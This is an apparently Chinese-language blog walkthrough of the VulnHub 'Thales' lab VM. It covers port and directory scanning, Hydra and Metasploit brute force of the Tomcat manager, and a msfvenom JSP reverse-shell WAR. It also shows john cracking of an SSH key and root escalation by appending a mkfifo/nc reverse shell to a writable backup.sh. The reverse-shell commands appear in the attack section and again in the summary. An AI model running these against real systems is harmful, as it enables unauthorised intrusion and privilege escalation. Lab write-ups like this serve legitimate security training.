+<p><code>OS CPE</code>为<code>cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3</code></p>
+<p><code>HOP</code>为<code>1</code>，往返时延<code>0.64</code>ms</p>
+<p>结果画像</p>
+<table>
+  <thead>
+      <tr>
+          <th>维度</th>
+          <th>数据</th>
+          <th>结论</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>操作系统</td>
+          <td>Ubuntu18.04(Linux 4.15)</td>
+          <td>偏旧的linux发行版，可能有内核漏洞</td>
+      </tr>
+      <tr>
+          <td>远程管理</td>
+          <td>OpenSSH 7.6p1</td>
+          <td>开放了SSH，如果能拿到用户名，可以尝试暴力破解或密钥登录</td>
+      </tr>
+      <tr>
+          <td>业务应用</td>
+          <td>Apache Tomecat 9.0.52</td>
+          <td>发布于2021年的java web服务器，可能有CVE</td>
+      </tr>
+      <tr>
+          <td>设备类型</td>
+          <td>General Purpose</td>
+          <td>是服务器，而非打印机或摄像头</td>
+      </tr>
+      <tr>
+          <td>地理位置</td>
+          <td>1Hop/0.64ms</td>
+          <td>在旁边(同一个局域网或本地虚拟机)</td>
+      </tr>
+  </tbody>
+</table>
+<h2 id="13-http">1.3 HTTP<a class="anchor" href="#13-http">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span>sudo gobuster dir -u http://192.168.203.137 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt</span></span></code></pre></div><p>得到<code>/docs /examples /shell /manager</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span>sudo gobuster dir -u http://192.168.203.137:8080 -w /usr/share/wordlists/dirb/common.txt</span></span></code></pre></div><p>得到<code>/favicon.ico /host-manager /shell</code></p>
+<p>尝试点击右边三个灰色按钮，<code>server status</code>、<code>manager app</code>、<code>host manager</code>，却发现要输入用户名和密码，因此尝试爆破</p>
+<h1 id="二攻击">二、攻击<a class="anchor" href="#%e4%ba%8c%e6%94%bb%e5%87%bb">#</a></h1>
+<h2 id="21-爆破">2.1 爆破<a class="anchor" href="#21-%e7%88%86%e7%a0%b4">#</a></h2>
+<h3 id="211-hydra">2.1.1 Hydra<a class="anchor" href="#211-hydra">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span>hydra -L /usr/share/wordlists/metasploit/tomcat_mgr_default_users.txt -P /usr/share/wordlists/metasploit/tomcat_mgr_default_pass.txt -s <span style="color:#ff9f43">8080</span> 192.168.203.137 http-get /manager/html</span></span></code></pre></div><p>得到账户密码：tomcat;role1（但这里过多失败尝试会锁定，只能重启靶机）</p>
+<h3 id="212-msf">2.1.2 msf<a class="anchor" href="#212-msf">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>msfconsole
+</span></span><span style="display:flex;"><span>search tomcat login
+</span></span><span style="display:flex;"><span>use auxiliary/scanner/http/tomcat_mgr_login
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">set</span> RHOSTS 192.168.203.137
+</span></span><span style="display:flex;"><span>exploit</span></span></code></pre></div><p>tomcat;role1</p>
+<h2 id="22-反弹shell">2.2 反弹shell<a class="anchor" href="#22-%e5%8f%8d%e5%bc%b9shell">#</a></h2>
+<p><img src="/docs/cybersecurity/vulnhub/medium/vulnhub_Thales/images/1.png" alt="" /></p>
+<p><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.203.129 LPORT=7777 -f war -o revshell.war</code></p>
+<p><img src="/docs/cybersecurity/vulnhub/medium/vulnhub_Thales/images/2.png" alt="" /></p>
+<p>成功反弹shell，接着升级shell界面，见<a href="/docs/cybersecurity/kali_linux%E5%9F%BA%E6%93%8D/#43-升级shell界面">kali linux基操 4.3 升级shell界面</a></p>
+<h2 id="23-shell中获取信息难">2.3 shell中获取信息（难）<a class="anchor" href="#23-shell%e4%b8%ad%e8%8e%b7%e5%8f%96%e4%bf%a1%e6%81%af%e9%9a%be">#</a></h2>
+<p>sudo权限分析：<code>sudo -l</code>，但密码不对，因此不用这个思路</p>
+<p><code>/home/thales</code>中发现两个<code>txt</code>文件，其中<code>user.txt</code>密码对不上
+<code>notes.txt</code>:</p>
+<pre tabindex="0"><code>I prepared a backup script for you. The script is in this directory &#34;/usr/local/bin/backup.sh&#34;. Good Luck.</code></pre><p>得到关键文件，<code>/usr/local/bin/backup.sh</code>内容如图，其具备读写执行的权限</p>
+<p><img src="/docs/cybersecurity/vulnhub/medium/vulnhub_Thales/images/3.png" alt="" />
+<img src="/docs/cybersecurity/vulnhub/medium/vulnhub_Thales/images/6.png" alt="" />
+同时发现隐藏文件夹，其中<code>.ssh</code>含有私钥</p>
+<p><img src="/docs/cybersecurity/vulnhub/medium/vulnhub_Thales/images/4.png" alt="" /></p>
+<p>私钥信息如下：</p>
+<p><img src="/docs/cybersecurity/vulnhub/medium/vulnhub_Thales/images/5.png" alt="" /></p>
+<h2 id="24-ssh私钥密码破解">2.4 ssh私钥密码破解<a class="anchor" href="#24-ssh%e7%a7%81%e9%92%a5%e5%af%86%e7%a0%81%e7%a0%b4%e8%a7%a3">#</a></h2>
+<p>把<code>id_rsa</code>和<code>id_rsa.pub</code>放到kali的thales文件夹中，接着用<code>ssh2john.py</code>脚本编译</p>
+<pre tabindex="0"><code>/usr/share/john/ssh2john.py id_rsa &gt; crack.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt crack.txt</code></pre><p>爆破获得密码：vodka06</p>
+<p><code>su thales</code>切换用户到thales，使用上述密码，接着可以看到user.txt的内容<code>a837c0b5d2a8a07225fd9905f5a0e9c4</code>，应该用md5解码，但要付钱，所以先不管</p>
+<h2 id="25-backupsh文件利用难">2.5 backup.sh文件利用（难）<a class="anchor" href="#25-backupsh%e6%96%87%e4%bb%b6%e5%88%a9%e7%94%a8%e9%9a%be">#</a></h2>
+<p>在文件中增加反弹shell</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span><span style="color:#ff5c57">echo</span> <span style="color:#5af78e">&#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.203.129 6666 &gt;/tmp/f&#34;</span> &gt;&gt; backup.sh
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>nc -lvvp <span style="color:#ff9f43">6666</span></span></span></code></pre></div><p>原理见见<a href="/docs/cybersecurity/kali_linux%E5%9F%BA%E6%93%8D/#416-利用有权限的文件反弹shell">kali linux基操 4.1.6 利用有权限的文件反弹shell</a>
+等一会获得root权限，获得root:<code>3a1c85bebf8833b0ecae900fb8598b17</code></p>
+<h1 id="三总结">三、总结<a class="anchor" href="#%e4%b8%89%e6%80%bb%e7%bb%93">#</a></h1>
+<p>这里的两步反弹shell，第一步看到浏览器的靶机网页中上传文件是能想到，但第二步再次利用有权限的文件反弹shell却是没有想到，这里最关键的是两个命令</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span>msfvenom -p java/jsp_shell_reverse_tcp <span style="color:#ff5c57">LHOST</span><span style="color:#ff6ac1">=</span>192.168.203.129 <span style="color:#ff5c57">LPORT</span><span style="color:#ff6ac1">=</span><span style="color:#ff9f43">7777</span> -f war -o revshell.war
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">echo</span> <span style="color:#5af78e">&#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.203.129 6666 &gt;/tmp/f&#34;</span> &gt;&gt; backup.sh</span></span></code></pre></div></article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex flex-wrap justify-between">
+
+<div>
+<a class="flex align-center" href="https://github.com/vnccer/vnccer.github.io/commit/f3118057084fd8b2fe3a55f39976eb54236450cb" title='Last modified by vnccer | May 15, 2026' target="_blank" rel="noopener">
+    <img src="/icons/calendar.svg" class="book-icon" alt="Calendar" />
+    <span>May 15, 2026</span>
+  </a>
+
+</div>
+
+<div>
+
+</div>
+
+</div>
+
+
+
+
+
+  
+  
+  
+  <div class="flex flex-wrap justify-between">
+    <span>
+    
+      <a href="/docs/cybersecurity/vulnhub/medium/vulnhub_Corrosion2/" class="flex align-center">
+        <img src="/icons/backward.svg" class="book-icon" alt="Backward" />
+        <span>Corrosion: 2</span>
+      </a>
+    
+    </span>
+    <span>
+    
+      <a href="/docs/cybersecurity/vulnhub/medium/vulnhub_Empire_lupinone/" class="flex align-center">
+        <span>Empire lupinone</span>
+        <img src="/icons/forward.svg" class="book-icon" alt="Forward" />
+      </a>
+    
+    </span>
+  </div>
+  
+
+
+ 
+        
+  
+  <div class="book-comments">
+
+</div>
+  
+ 
+        
+        
+  
+  <div class="book-copyright flex justify-center">
+    <small>vnccer - <a href="https://creativecommons.org/licenses/by/4.0/legalcode">© CC BY 4.0</a></small>
+  </div>
+  
+ 
+        
+  
+  
+    <script>(function(){document.querySelectorAll("pre:has(code)").forEach(e=>{e.addEventListener("click",e.focus),e.addEventListener("copy",function(t){if(t.preventDefault(),navigator.clipboard){const t=window.getSelection().toString()||e.textContent;navigator.clipboard.writeText(t)}})})})()</script>
+  
+
+      </footer>
+
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+  
+  <aside class="book-toc">
+    <div class="book-toc-content">
+      
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#一侦测">一、侦测</a>
+      <ul>
+        <li><a href="#thales">Thales</a></li>
+        <li><a href="#12-端口">1.2 端口</a></li>
+        <li><a href="#13-http">1.3 HTTP</a></li>
+      </ul>
+    </li>
+    <li><a href="#二攻击">二、攻击</a>
+      <ul>
+        <li><a href="#21-爆破">2.1 爆破</a>
+          <ul>
+            <li><a href="#211-hydra">2.1.1 Hydra</a></li>
+            <li><a href="#212-msf">2.1.2 msf</a></li>
+          </ul>
+        </li>
+        <li><a href="#22-反弹shell">2.2 反弹shell</a></li>
+        <li><a href="#23-shell中获取信息难">2.3 shell中获取信息（难）</a></li>
+        <li><a href="#24-ssh私钥密码破解">2.4 ssh私钥密码破解</a></li>
+        <li><a href="#25-backupsh文件利用难">2.5 backup.sh文件利用（难）</a></li>
+      </ul>
+    </li>
+    <li><a href="#三总结">三、总结</a></li>
+  </ul>
+</nav>
+
+
+
+    </div>
+  </aside>
+  
+ 
+  </main>
+
+  
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
